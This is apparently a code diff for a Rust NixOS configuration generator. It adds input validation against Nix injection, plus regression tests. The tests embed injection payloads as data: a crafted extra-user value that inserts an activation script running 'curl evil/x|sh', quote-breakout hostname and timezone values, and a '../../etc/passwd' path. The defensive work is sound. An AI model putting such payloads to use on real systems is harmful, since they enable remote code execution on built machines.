@@ -174,6 +174,71 @@ pub fn generate(
         );
     }
 
+    // ── Validate & sanitize security-sensitive identifiers ──
+    //
+    // hostname/username/extra_users become bare Nix attribute names
+    // (`users.users.NAME = { ... };`, `networking.hostName = "NAME";`).
+    // `validate_hostname`/`validate_username` already exist for the UI
+    // wizard's step-1 gate, but `generate()` itself -- the actual
+    // codegen entry point -- never called them, so any caller that
+    // bypasses that gate (a future programmatic caller, or a UI path
+    // that sets these fields without going through step 1) could embed
+    // arbitrary Nix source via a crafted hostname/username/extra_users
+    // value. Validate here so every caller is protected, not just the
+    // wizard's "Next" button.
+    let safe_hostname = match crate::validation::validate_hostname(&choices.hostname) {
+        Ok(h) => h,
+        Err(e) => {
+            warnings.push(format!(
+                "Invalid hostname '{}': {e} — using 'nixos' instead",
+                choices.hostname
+            ));
+            "nixos".to_string()
+        }
+    };
+    let safe_username = match crate::validation::validate_username(&choices.username) {
+        Ok(u) => u,
+        Err(e) => {
+            warnings.push(format!(
+                "Invalid username '{}': {e} — using 'user' instead",
+                choices.username
+            ));
+            "user".to_string()
+        }
+    };
+    let mut safe_extra_users: Vec<String> = Vec::new();
+    for extra in &choices.extra_users {
+        if extra.trim().is_empty() {
+            continue;
+        }
+        match crate::validation::validate_username(extra) {
+            Ok(u) => safe_extra_users.push(u),
+            Err(e) => warnings.push(format!("Skipping invalid extra user '{extra}': {e}")),
+        }
+    }
+
+    // timezone/keyboard/locale are interpolated into quoted Nix string
+    // literals (`time.timeZone = "..."`, etc.) rather than bare
+    // identifiers, but an embedded `"` or `${` could still break out of
+    // the string. Reject anything containing those rather than trying to
+    // escape them (these fields are short, structured values -- a reject
+    // is simpler and safer than an escaper that might miss a case).
+    let safe_timezone =
+        sanitize_nix_string_literal(&choices.timezone, "UTC", "timezone", &mut warnings);
+    let safe_keyboard =
+        sanitize_nix_string_literal(&choices.keyboard, "us", "keyboard layout", &mut warnings);
+    let safe_locale =
+        sanitize_nix_string_literal(&choices.locale, "en_US.UTF-8", "locale", &mut warnings);
+
+    let mut safe_choices = choices.clone();
+    safe_choices.hostname = safe_hostname;
+    safe_choices.username = safe_username;
+    safe_choices.extra_users = safe_extra_users;
+    safe_choices.timezone = safe_timezone;
+    safe_choices.keyboard = safe_keyboard;
+    safe_choices.locale = safe_locale;
+    let choices = &safe_choices;
+
     // ── Resolve custom package aliases ──
     let mut resolved_custom: Vec<String> = Vec::new();
     for raw in &choices.custom_packages {
@@ -923,6 +988,32 @@ fn is_valid_nix_attr(name: &str) -> bool {
     }
     name.chars()
         .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.' || c == '_')
+}
+
+/// Validate a value destined for a quoted Nix string literal (e.g.
+/// `time.timeZone = "{value}"`). Rejects (rather than escapes) anything
+/// containing `"`, `\`, or `${` -- any of which could break out of the
+/// string literal or trigger Nix string interpolation -- falling back to
+/// `fallback` and recording a warning. These fields (timezone, keyboard
+/// layout, locale) are short structured values, so a reject-on-suspicious
+/// -input policy is simpler and safer than trying to escape correctly.
+fn sanitize_nix_string_literal(
+    value: &str,
+    fallback: &str,
+    field_name: &str,
+    warnings: &mut Vec<String>,
+) -> String {
+    let trimmed = value.trim();
+    if trimmed.is_empty() {
+        return fallback.to_string();
+    }
+    if trimmed.contains('"') || trimmed.contains('\\') || trimmed.contains("${") {
+        warnings.push(format!(
+            "Invalid {field_name} '{value}': contains disallowed characters — using '{fallback}' instead"
+        ));
+        return fallback.to_string();
+    }
+    trimmed.to_string()
 }
 
 /// Lightweight structural validation of generated Nix configuration.
@@ -1992,6 +2083,71 @@ mod tests {
         c.hostname = "".into();
         let result = generate(&test_hw(), &c, &[]);
         // Should still generate valid config
+        let errors = validate_nix_syntax(&result.configuration_nix);
+        assert!(errors.is_empty());
+    }
+
+    /// Regression test for the Nix-injection finding: `generate()` itself
+    /// (not just the UI wizard's step-1 gate) must reject a malicious
+    /// `extra_users` entry that tries to break out of the
+    /// `users.users.NAME = { ... };` attribute-name context.
+    #[test]
+    fn malicious_extra_user_is_rejected_not_embedded() {
+        let mut c = test_choices();
+        c.extra_users = vec![
+            "x; }; system.activationScripts.pwn.text = \"curl evil/x|sh\"; users.users.y = {"
+                .to_string(),
+        ];
+        let result = generate(&test_hw(), &c, &[]);
+        assert!(
+            !result.configuration_nix.contains("activationScripts.pwn"),
+            "malicious extra_users payload leaked into generated Nix source"
+        );
+        assert!(
+            !result.warnings.is_empty(),
+            "invalid extra_users entry should produce a warning"
+        );
+        let errors = validate_nix_syntax(&result.configuration_nix);
+        assert!(
+            errors.is_empty(),
+            "output must still be syntactically valid Nix"
+        );
+    }
+
+    /// Same regression, but for `hostname` directly (bare Nix identifier
+    /// context via `networking.hostName` / the wizard's other embed sites).
+    #[test]
+    fn malicious_hostname_is_rejected_not_embedded() {
+        let mut c = test_choices();
+        c.hostname = "x\"; system.activationScripts.pwn.text = \"pwned".to_string();
+        let result = generate(&test_hw(), &c, &[]);
+        assert!(
+            !result.configuration_nix.contains("activationScripts.pwn"),
+            "malicious hostname payload leaked into generated Nix source"
+        );
+        assert!(!result.warnings.is_empty());
+    }
+
+    /// A caller that bypasses the UI wizard's step-1 validation gate
+    /// entirely (e.g. constructs `UserChoices` programmatically) must
+    /// still be protected, since `generate()` now validates internally.
+    #[test]
+    fn generate_validates_even_without_ui_gate() {
+        let mut c = test_choices();
+        c.username = "../../etc/passwd".to_string();
+        let result = generate(&test_hw(), &c, &[]);
+        assert!(result.configuration_nix.contains("users.users.user"));
+        assert!(!result.configuration_nix.contains("../"));
+    }
+
+    /// Timezone/keyboard/locale are quoted Nix string literals; an
+    /// embedded `"` must not be able to break out of the string.
+    #[test]
+    fn malicious_timezone_is_rejected() {
+        let mut c = test_choices();
+        c.timezone = "UTC\"; system.activationScripts.pwn.text = \"pwned".to_string();
+        let result = generate(&test_hw(), &c, &[]);
+        assert!(!result.configuration_nix.contains("activationScripts.pwn"));
         let errors = validate_nix_syntax(&result.configuration_nix);
         assert!(errors.is_empty());
     }
